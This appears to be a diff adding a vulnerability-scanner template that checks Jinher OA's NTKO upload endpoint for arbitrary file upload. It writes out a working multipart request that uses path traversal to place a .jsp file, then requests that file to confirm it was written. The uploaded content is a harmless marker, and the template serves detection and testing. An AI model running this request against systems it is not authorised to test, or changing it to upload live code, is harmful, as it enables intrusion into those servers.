@@ -1,0 +1,59 @@
+id: jinher-oa-ntko-upload-anyfile-upload
+
+info:
+  name: Jinher OA NTKO Upload Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Vulnerability in Jinher OA NTKO upload functionality allows arbitrary file upload, leading to potential system compromise.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----zqulxi4ku42pfmoelvc0
+
+        ------zqulxi4ku42pfmoelvc0
+        Content-Disposition: form-data; name="filename"
+
+        ../../../../upload/{{t1}}.jsp
+        ------zqulxi4ku42pfmoelvc0
+        Content-Disposition: form-data; name="upLoadFile"; filename="{{t1}}.jpg"
+        Content-Type: image/jpeg
+
+        {{t2}}
+        ------zqulxi4ku42pfmoelvc0
+        Content-Disposition: form-data; name="Submit"
+
+        upload
+        ------zqulxi4ku42pfmoelvc0--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ok"
+
+  - raw:
+      - |
+        GET /upload/{{t1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
